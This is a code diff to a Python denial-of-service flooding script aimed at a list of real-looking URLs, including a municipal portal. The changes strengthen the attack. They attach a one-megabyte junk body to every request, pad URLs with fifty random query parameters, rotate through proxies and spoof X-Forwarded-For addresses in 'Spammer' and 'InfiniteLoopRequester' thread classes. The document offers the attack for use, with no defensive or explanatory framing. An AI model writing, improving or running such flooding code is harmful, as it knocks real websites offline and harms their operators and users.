@@ -8237,10 +8237,16 @@ infinite_loop_urls = [
     "http://portal.veendam.nl"
 ]
 
+# Generate a large payload for each request
+def generate_large_payload(size=10**6):  # Default 1MB payload
+    return "A" * size
+
 class Spammer(threading.Thread):
     def __init__(self, url, number, proxy_list):
         threading.Thread.__init__(self)
-        self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
+        self.url = url + "?" + "&".join(
+            [f"param{random.randint(0, 99999)}={random.randint(0, 99999)}" for _ in range(50)]
+        )  # Larger query string
         self.num = number
         self.headers = {
             'User-Agent': random.choice(ua),
@@ -8260,7 +8266,7 @@ class Spammer(threading.Thread):
 
     def request(self):
         global N
-        data = None
+        data = generate_large_payload()  # Include a larger body in the request
         with self.lock:  # Ensure atomic operation for N management
             proxy = self.proxy_list[N]
             N = (N + 1) % len(self.proxy_list)  # Rotate proxy index
@@ -8269,7 +8275,7 @@ class Spammer(threading.Thread):
         opener = urllib.request.build_opener(proxy_handler)
         urllib.request.install_opener(opener)
 
-        req = urllib.request.Request(self.url, data, self.headers)
+        req = urllib.request.Request(self.url, data.encode('utf-8'), self.headers)  # Send large payload
         urllib.request.urlopen(req)
 
         print(Fore.RED + "0000000000000000000000000000")
@@ -8314,7 +8320,8 @@ class InfiniteLoopRequester(threading.Thread):
                         'Upgrade-Insecure-Requests': '1',
                         'X-Forwarded-For': random.choice(spoofed_ips),
                     }
-                    req = urllib.request.Request(url, None, headers)
+                    data = generate_large_payload()
+                    req = urllib.request.Request(url, data.encode('utf-8'), headers)
                     urllib.request.urlopen(req)
 
                     print(Fore.GREEN + f"Request sent to {url} with spoofed IP {headers['X-Forwarded-For']}")
